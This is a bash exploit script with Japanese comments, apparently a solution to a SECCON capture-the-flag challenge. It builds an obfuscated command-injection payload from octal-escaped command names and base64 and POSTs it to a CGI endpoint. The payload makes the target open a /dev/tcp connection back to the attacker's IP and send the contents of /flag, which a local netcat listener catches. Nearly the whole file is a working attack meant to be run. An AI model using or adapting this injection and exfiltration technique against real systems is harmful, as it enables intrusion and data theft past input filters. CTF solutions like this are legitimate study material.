#!/bin/bash

# ubuntuで動作確認しています

PORT="9888"              # 任意(カスタマイズ不要)

function ConvertOctalNumber(){
echo -n '$'\'''

for WORD in $(echo $@|grep -o .)
do
  printf '\'
  echo $WORD|xxd -p|cut -c1-2|echo "obase=8; ibase=16; $(cat -|tr a-z A-Z)"|bc|tr -d '\n'
done

cat << EOS
'
EOS
}

if [ "" = "$2" ]
then
  echo usage: $0 [target_hostname] [own_global_ip]
  exit 1
  #TARGET_HOST="172.22.1.8" # 本番は multiplicater.seccon.jp になる予定
  #OWN_HOST="172.22.1.8"    # 自分のグローバルIPアドレス
else
  TARGET_HOST="$1"
  OWN_HOST="$2"
fi

#-----------#
# make POST #
#-----------#
# exec 3<> /dev/tcp/localhost/9888;cat /flag >&3

## ここは消さないで
## ___[$(__=$($'\144\141\164\145');__=${__:3:1};$'\145\143\150\157'${__}
## |$'\142\141\163\145'64${__}-$'\144'|$'\142\141\163\150'>&2)]

#echo これをURLエンコードしてPOST変数にセットして
cat ./$0|grep '^## '|head -2|tail -1|cut -c4-|tr -d '\n' > /tmp/post.txt
BASE64=$(echo -n "exec 3<> /dev/tcp/$OWN_HOST/$PORT;cat /flag >&3"|base64)
ConvertOctalNumber $BASE64 |tr -d '\n' >> /tmp/post.txt
cat ./$0|grep '^## '|tail -1|cut -c4- >> /tmp/post.txt
POST=$(cat /tmp/post.txt | nkf -WwMQ | sed 's/=$//g' | tr = % |sed 's/%5F/_/g'|tr A-Z a-z| tr -d '\n')
#read DUMMY

#------#
# main #
#------#
nc -l $PORT&
# 本番は http を https に修正すること
curl "http://$TARGET_HOST/cgi-bin/index.cgi" \
 -H 'Connection: keep-alive' \
 -H 'Pragma: no-cache' \
 -H 'Cache-Control: no-cache' \
 -H "Origin: http://$TARGET_HOST" \
 -H 'Upgrade-Insecure-Requests: 1' \
 -H 'Content-Type: application/x-www-form-urlencoded' \
 -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36' \
 -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' \
 -H "Referer: http://$TARGET_HOST/cgi-bin/" -H 'Accept-Encoding: gzip, deflate' \
 -H 'Accept-Language: ja,en-US;q=0.9,en;q=0.8' \
 --data "var1=$POST&var2=999" --compressed --insecure \
 -s -o /dev/null
